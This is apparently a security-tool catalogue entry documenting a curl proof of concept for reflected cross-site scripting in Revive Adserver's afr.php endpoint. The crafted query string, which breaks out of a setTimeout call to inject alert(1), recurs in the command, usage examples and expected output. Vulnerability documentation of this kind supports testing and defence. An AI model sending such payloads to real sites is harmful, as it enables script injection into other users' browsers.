---
id: cmd-curl-xss-poc
data: >
  curl
  "domain.com/www/delivery/afr.php?refresh=10000&\")',10000000);alert(1);setTimeout('alert(\"""
tags:
  - xss
  - poc
  - http-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:18.226Z'
verified: false
validated: true
submitted: true
---
# curl-reflected-xss-poc-revive

## Command

```bash
curl "domain.com/www/delivery/afr.php?refresh=10000&\")',10000000);alert(1);setTimeout('alert(\"""
```

## Description

This curl command sends an HTTP GET request to the vulnerable Revive Adserver endpoint with a malicious query string payload designed to exploit reflected XSS by injecting JavaScript that executes an alert(1) in the browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target endpoint with payload in query string | Yes |
| refresh=10000 | Sets the refresh interval parameter to 10000 ms | Yes |

## Examples

### Basic Usage

```bash
curl "domain.com/www/delivery/afr.php?refresh=10000&\")',10000000);alert(1);setTimeout('alert(\"""
```

### Advanced Usage

To save the response for analysis:

```bash
curl -o response.html "domain.com/www/delivery/afr.php?refresh=10000&\")',10000000);alert(1);setTimeout('alert(\"""
```

## Expected Output

The command returns the HTML response from the server, which includes the reflected payload in a <script> tag: setTimeout('window.location.replace("http://domain.com/www/delivery/afr.php?refresh=10000&")',10000000);alert(1);setTimeout('alert("&loc=")', 10000000);. When this HTML is loaded in a browser, it executes the alert(1).

## Related

- [[procedures/Exploit-Reflected-XSS-with-Curl-POC]]
